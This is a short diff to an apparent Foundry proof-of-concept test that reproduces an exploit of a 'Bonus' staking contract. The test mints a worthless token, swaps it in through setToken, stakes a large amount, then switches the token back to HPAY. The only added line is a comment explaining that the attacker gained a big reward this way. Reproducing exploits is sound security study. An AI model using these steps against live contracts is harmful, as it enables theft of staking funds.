@@ -35,6 +35,7 @@ contract ContractTest is DSTest{
         shitcoin.mint(100_000_000 * 1e18);
         shitcoin.approve(address(Bonus), type(uint).max);
         Bonus.setToken(address(shitcoin));
+        // the attacker was able to stake big amount of token, so he got big reward
         Bonus.stake(shitcoin.balanceOf(address(this)));
         Bonus.setToken(address(HPAY));
         // change block.number
